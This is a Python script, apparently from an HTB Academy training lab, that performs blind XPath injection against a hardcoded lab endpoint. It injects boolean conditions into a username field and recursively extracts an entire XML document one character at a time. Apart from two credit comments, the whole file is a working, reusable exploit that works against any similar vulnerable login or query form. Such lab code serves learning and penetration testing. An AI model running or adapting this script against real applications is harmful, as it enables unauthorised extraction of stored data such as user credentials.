# Credit for this goes to HTB Academy. I was stuck on this script -- had it about half working. 
# Ended up getting help from HTB Academy and this is the final script that worked for me :) 

import requests, sys, string

URL = "http://94.237.62.147:57464/index.php"
POSITIVE_STRING = "Message successfully sent!"

# return true if positive result, return false if negative result
def inject(payload):
	payload = f"invalid' or {payload} and '1'='1"
	r = requests.post(URL, data={'username': payload})

	if POSITIVE_STRING in r.text:
		return True
	return False

def exfiltrate_length(subquery, max_length=50):
	for i in range(max_length):
		payload = f"string-length({subquery})={i}"

		if inject(payload):
			return i
	print(f"Unable to determine length of {subquery}")
	sys.exit(0)

def exfiltrate_data(subquery):
	l = exfiltrate_length(subquery)
	data = ""
	for i in range(l):
		for c in string.printable:
			payload = f"substring({subquery},{i+1},1)='{c}'"
			if inject(payload):
				data += c
				break
	return data

def exfiltrate_no_children(subquery, mix_child=20):
	for i in range(mix_child):
		payload = f"count({subquery})={i}"
		if inject(payload):
			return i
	print(f"Unable to determine number of children of {subquery}")
	sys.exit(0)

def exfiltrate_schema(base_node, depth=0):
	name = exfiltrate_data(f'name({base_node})')
	n = exfiltrate_no_children(base_node + '/*')
	
	print(' ' * depth + f'<{name}>')

	for i in range(n):
		exfiltrate_schema(base_node + f'/*[{i+1}]', depth=depth+1)

	if n == 0:
		data = exfiltrate_data(base_node)
		print(' ' * (depth+1) + data)

	print(' ' * depth + f'</{name}>')

if __name__ == '__main__':
	print('Exfiltrating XML document:')
	exfiltrate_schema('/*[1]')